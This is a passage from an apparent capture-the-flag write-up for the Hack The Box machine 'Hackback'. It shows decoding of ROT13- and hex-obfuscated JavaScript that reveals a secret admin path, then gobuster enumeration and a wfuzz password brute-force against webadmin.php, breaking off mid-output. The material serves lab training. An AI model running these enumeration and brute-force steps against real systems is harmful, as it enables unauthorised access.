class="string">'yratgu'</span>];O++)&#123;N=(N+<span class="number">0</span>k1)%<span class="number">0</span>k100;h=(h+g[N])%<span class="number">0</span>k100;i=g[N];g[N]=g[h];g[h]=i;j+=Fgevat[<span class="string">'sebzPunePbqr'</span>](e[<span class="string">'punePbqrNg'</span>](O)^g[(g[N]+g[h])%<span class="number">0</span>k100]);&#125;erghea j;&#125;;o[<span class="string">'BbNPpq'</span>]=d;o[<span class="string">'dFYjTx'</span>]=&#123;&#125;;o[<span class="string">'ZfHYzi'</span>]=!![];&#125;ine P=o[<span class="string">'dFYjTx'</span>][p];vs(P===haqrsvarq)&#123;vs(o[<span class="string">'cVwyDO'</span>]===haqrsvarq)&#123;o[<span class="string">'cVwyDO'</span>]=!![];&#125;r=o[<span class="string">'BbNPpq'</span>](r,q);o[<span class="string">'dFYjTx'</span>][p]=r;&#125;ryfr&#123;r=P;&#125;erghea r;&#125;;ine k=<span class="string">'\k53\k65\k63\k75\k72\k65\k20\k4p\k6s\k67\k69\k6r\k20\k42\k79\k70\k61\k73\k73'</span>;ine m=o(<span class="string">'0k0'</span>,<span class="string">'\k50\k5q\k53\k36'</span>);ine u=o(<span class="string">'0k1'</span>,<span class="string">'\k72\k37\k54\k59'</span>);ine l=o(<span class="string">'0k2'</span>,<span class="string">'\k44\k41\k71\k67'</span>);ine g=<span class="string">'\k3s\k61\k63\k74\k69\k6s\k6r\k3q\k28\k73\k68\k6s\k77\k2p\k6p\k69\k73\k74\k2p\k65\k78\k65\k63\k2p\k69\k6r\k69\k74\k29'</span>;ine f=<span class="string">'\k26\k73\k69\k74\k65\k3q\k28\k74\k77\k69\k74\k74\k65\k72\k2p\k70\k61\k79\k70\k61\k6p\k2p\k66\k61\k63\k65\k62\k6s\k6s\k6o\k2p\k68\k61\k63\k6o\k74\k68\k65\k62\k6s\k78\k29'</span>;ine v=<span class="string">'\k26\k70\k61\k73\k73\k77\k6s\k72\k64\k3q\k2n\k2n\k2n\k2n\k2n\k2n\k2n\k2n'</span>;ine x=<span class="string">'\k26\k73\k65\k73\k73\k69\k6s\k6r\k3q'</span>;ine j=<span class="string">'\k4r\k6s\k74\k68\k69\k6r\k67\k20\k6q\k6s\k72\k65\k20\k74\k6s\k20\k73\k61\k79'</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>First thing we notice is that it’s not actually <code>js</code>. <code>ine n</code> ? This doesn’t look like <code>js</code>, most likely it’s gonna be <code>var</code>. <code>v</code> is the 22nd letter in alphabet while <code>i</code> is the 9th. <code>22 - 9 = 13</code><br>So this script is <code>rot 13</code> encoded. I used <a href="https://www.rot13.com" target="_blank" rel="noopener">rot13.com</a> to decode it :<br><img src="/images/hackthebox/hackback/7.png" alt=""></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="string">'\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33'</span>,<span class="string">'\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d'</span>,<span class="string">'\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;<span class="keyword">var</span> e=<span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;<span class="keyword">while</span>(--f)&#123;c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());&#125;&#125;;e(++d);&#125;(a,<span class="number">0x66</span>));<span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;c=c<span class="number">-0x0</span>;<span class="keyword">var</span> e=a[c];<span class="keyword">if</span>(b[<span class="string">'MsULmv'</span>]===<span class="literal">undefined</span>)&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> f;<span class="keyword">try</span>&#123;<span class="keyword">var</span> g=<span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span>+<span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span>+<span class="string">');'</span>);f=g();&#125;<span class="keyword">catch</span>(h)&#123;f=<span class="built_in">window</span>;&#125;<span class="keyword">var</span> i=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;f[<span class="string">'atob'</span>]||(f[<span class="string">'atob'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;<span class="keyword">var</span> k=<span class="built_in">String</span>(j)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>,<span class="string">''</span>);<span class="keyword">for</span>(<span class="keyword">var</span> l=<span class="number">0x0</span>,m,n,o=<span class="number">0x0</span>,p=<span class="string">''</span>;n=k[<span class="string">'charAt'</span>](o++);~n&amp;&amp;(m=l%<span class="number">0x4</span>?m*<span class="number">0x40</span>+n:n,l++%<span class="number">0x4</span>)?p+=<span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span>&amp;m&gt;&gt;(<span class="number">-0x2</span>*l&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;n=i[<span class="string">'indexOf'</span>](n);&#125;<span class="keyword">return</span> p;&#125;);&#125;());<span class="keyword">var</span> q=<span class="function"><span class="keyword">function</span>(<span class="params">r,d</span>)</span>&#123;<span class="keyword">var</span> t=[],u=<span class="number">0x0</span>,v,w=<span class="string">''</span>,x=<span class="string">''</span>;r=atob(r);<span class="keyword">for</span>(<span class="keyword">var</span> y=<span class="number">0x0</span>,z=r[<span class="string">'length'</span>];y&lt;z;y++)&#123;x+=<span class="string">'%'</span>+(<span class="string">'00'</span>+r[<span class="string">'charCodeAt'</span>](y)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);&#125;r=<span class="built_in">decodeURIComponent</span>(x);<span class="keyword">for</span>(<span class="keyword">var</span> A=<span class="number">0x0</span>;A&lt;<span class="number">0x100</span>;A++)&#123;t[A]=A;&#125;<span class="keyword">for</span>(A=<span class="number">0x0</span>;A&lt;<span class="number">0x100</span>;A++)&#123;u=(u+t[A]+d[<span class="string">'charCodeAt'</span>](A%d[<span class="string">'length'</span>]))%<span class="number">0x100</span>;v=t[A];t[A]=t[u];t[u]=v;&#125;A=<span class="number">0x0</span>;u=<span class="number">0x0</span>;<span class="keyword">for</span>(<span class="keyword">var</span> B=<span class="number">0x0</span>;B&lt;r[<span class="string">'length'</span>];B++)&#123;A=(A+<span class="number">0x1</span>)%<span class="number">0x100</span>;u=(u+t[A])%<span class="number">0x100</span>;v=t[A];t[A]=t[u];t[u]=v;w+=<span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](r[<span class="string">'charCodeAt'</span>](B)^t[(t[A]+t[u])%<span class="number">0x100</span>]);&#125;<span class="keyword">return</span> w;&#125;;b[<span class="string">'OoACcd'</span>]=q;b[<span class="string">'qSLwGk'</span>]=&#123;&#125;;b[<span class="string">'MsULmv'</span>]=!![];&#125;<span class="keyword">var</span> C=b[<span class="string">'qSLwGk'</span>][c];<span class="keyword">if</span>(C===<span class="literal">undefined</span>)&#123;<span class="keyword">if</span>(b[<span class="string">'pIjlQB'</span>]===<span class="literal">undefined</span>)&#123;b[<span class="string">'pIjlQB'</span>]=!![];&#125;e=b[<span class="string">'OoACcd'</span>](e,d);b[<span class="string">'qSLwGk'</span>][c]=e;&#125;<span class="keyword">else</span>&#123;e=C;&#125;<span class="keyword">return</span> e;&#125;;<span class="keyword">var</span> x=<span class="string">'\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73'</span>;<span class="keyword">var</span> z=b(<span class="string">'0x0'</span>,<span class="string">'\x50\x5d\x53\x36'</span>);<span class="keyword">var</span> h=b(<span class="string">'0x1'</span>,<span class="string">'\x72\x37\x54\x59'</span>);<span class="keyword">var</span> y=b(<span class="string">'0x2'</span>,<span class="string">'\x44\x41\x71\x67'</span>);<span class="keyword">var</span> t=<span class="string">'\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29'</span>;<span class="keyword">var</span> s=<span class="string">'\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29'</span>;<span class="keyword">var</span> i=<span class="string">'\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a'</span>;<span class="keyword">var</span> k=<span class="string">'\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d'</span>;<span class="keyword">var</span> w=<span class="string">'\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79'</span>;</span><br></pre></td></tr></table></figure>
<p>Now this is better. I also used a <code>js</code> beautifier to make it easily readable :<br><img src="/images/hackthebox/hackback/8.png" alt=""></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">'\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33'</span>, <span class="string">'\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d'</span>, <span class="string">'\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--f) &#123;</span><br><span class="line">            c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    e(++d);</span><br><span class="line">&#125;(a, <span class="number">0x66</span>));</span><br><span class="line"><span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">'MsULmv'</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> f;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> g = <span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span> + <span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span> + <span class="string">');'</span>);</span><br><span class="line">                f = g();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (h) &#123;</span><br><span class="line">                f = <span class="built_in">window</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> i = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;</span><br><span class="line">            f[<span class="string">'atob'</span>] || (f[<span class="string">'atob'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">j</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> k = <span class="built_in">String</span>(j)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>, <span class="string">''</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">0x0</span>, m, n, o = <span class="number">0x0</span>, p = <span class="string">''</span>; n = k[<span class="string">'charAt'</span>](o++); ~n &amp;&amp; (m = l % <span class="number">0x4</span> ? m * <span class="number">0x40</span> + n : n, l++ % <span class="number">0x4</span>) ? p += <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span> &amp; m &gt;&gt; (<span class="number">-0x2</span> * l &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">                    n = i[<span class="string">'indexOf'</span>](n);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;());</span><br><span class="line">        <span class="keyword">var</span> q = <span class="function"><span class="keyword">function</span>(<span class="params">r, d</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> t = [],</span><br><span class="line">                u = <span class="number">0x0</span>,</span><br><span class="line">                v, w = <span class="string">''</span>,</span><br><span class="line">                x = <span class="string">''</span>;</span><br><span class="line">            r = atob(r);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> y = <span class="number">0x0</span>, z = r[<span class="string">'length'</span>]; y &lt; z; y++) &#123;</span><br><span class="line">                x += <span class="string">'%'</span> + (<span class="string">'00'</span> + r[<span class="string">'charCodeAt'</span>](y)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r = <span class="built_in">decodeURIComponent</span>(x);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> A = <span class="number">0x0</span>; A &lt; <span class="number">0x100</span>; A++) &#123;</span><br><span class="line">                t[A] = A;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (A = <span class="number">0x0</span>; A &lt; <span class="number">0x100</span>; A++) &#123;</span><br><span class="line">                u = (u + t[A] + d[<span class="string">'charCodeAt'</span>](A % d[<span class="string">'length'</span>])) % <span class="number">0x100</span>;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">            &#125;</span><br><span class="line">            A = <span class="number">0x0</span>;</span><br><span class="line">            u = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> B = <span class="number">0x0</span>; B &lt; r[<span class="string">'length'</span>]; B++) &#123;</span><br><span class="line">                A = (A + <span class="number">0x1</span>) % <span class="number">0x100</span>;</span><br><span class="line">                u = (u + t[A]) % <span class="number">0x100</span>;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">                w += <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](r[<span class="string">'charCodeAt'</span>](B) ^ t[(t[A] + t[u]) % <span class="number">0x100</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> w;</span><br><span class="line">        &#125;;</span><br><span class="line">        b[<span class="string">'OoACcd'</span>] = q;</span><br><span class="line">        b[<span class="string">'qSLwGk'</span>] = &#123;&#125;;</span><br><span class="line">        b[<span class="string">'MsULmv'</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> C = b[<span class="string">'qSLwGk'</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (C === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b[<span class="string">'pIjlQB'</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            b[<span class="string">'pIjlQB'</span>] = !![];</span><br><span class="line">        &#125;</span><br><span class="line">        e = b[<span class="string">'OoACcd'</span>](e, d);</span><br><span class="line">        b[<span class="string">'qSLwGk'</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        e = C;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> x = <span class="string">'\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73'</span>;</span><br><span class="line"><span class="keyword">var</span> z = b(<span class="string">'0x0'</span>, <span class="string">'\x50\x5d\x53\x36'</span>);</span><br><span class="line"><span class="keyword">var</span> h = b(<span class="string">'0x1'</span>, <span class="string">'\x72\x37\x54\x59'</span>);</span><br><span class="line"><span class="keyword">var</span> y = b(<span class="string">'0x2'</span>, <span class="string">'\x44\x41\x71\x67'</span>);</span><br><span class="line"><span class="keyword">var</span> t = <span class="string">'\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29'</span>;</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29'</span>;</span><br><span class="line"><span class="keyword">var</span> i = <span class="string">'\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a'</span>;</span><br><span class="line"><span class="keyword">var</span> k = <span class="string">'\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d'</span>;</span><br><span class="line"><span class="keyword">var</span> w = <span class="string">'\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79'</span>;</span><br></pre></td></tr></table></figure>
<p>As you can see it’s still heavily obfuscated, I solved this by pasting the code in the <code>js</code> console. It will do the magic happening in these functions then we can just read the variables at the bottom of the script : <code>x z h y t s i k w</code><br><img src="/images/hackthebox/hackback/9.png" alt=""><br>We got this message :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Secure Login Bypass</span><br><span class="line">Remember the secret path is</span><br><span class="line">2bb6916122f1da34dcd916421e531578</span><br><span class="line">Just in case I loose access to the admin panel</span><br><span class="line">?action&#x3D;(show,list,exec,init)</span><br><span class="line">&amp;site&#x3D;(twitter,paypal,facebook,hackthebox)</span><br><span class="line">&amp;password&#x3D;*****</span><br><span class="line">&amp;session&#x3D;</span><br><span class="line">Nothing more to say</span><br></pre></td></tr></table></figure>
<p>Going to that path only caused a redirect, so we need to enumerate more.</p>
<h2 id="Accessing-the-Secret-Path"><a href="#Accessing-the-Secret-Path" class="headerlink" title="Accessing the Secret Path"></a>Accessing the Secret Path</h2><p>From the secret message we know what parameters it’s expecting us to send : (<code>?action=&amp;site=&amp;password=&amp;session=</code>). This is probably gonna be a <code>php</code> page. So I ran <code>gobuster</code> on that path with the same wordlist I used before and <code>.php</code> extension :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# gobuster -u http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -x php</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Extensions   : php</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;07&#x2F;05 10:08:09 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;webadmin.php (Status: 302)</span><br></pre></td></tr></table></figure>
<p>Great we got <code>webadmin.php</code>, I tried again and now I didn’t get a redirect :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# curl &#39;http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F;webadmin.php?action&#x3D;list&amp;site&#x3D;hackthebox&amp;password&#x3D;test&amp;session&#x3D;&#39;</span><br><span class="line">Wrong secret key!</span><br></pre></td></tr></table></figure>
<p>But I got <code>Wrong secret key!</code>, and that’s expected because I set the password to <code>test</code>. I used <code>wfuzz</code> again with <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt" target="_blank" rel="noopener">darkweb2017-top10000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">seclists</a> to bruteforce the password which happened to be a very easy one :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# wfuzz -u &#39;http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F;webadmin.php?action&#x3D;list&amp;site&#x3D;hackthebox&amp;password&#x3D;FUZZ&amp;session&#x3D;&#39; -w darkweb2017-top10000.txt </span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line">* Wfuzz 2.3.4 - The Web Fuzzer                         *</span><br><span 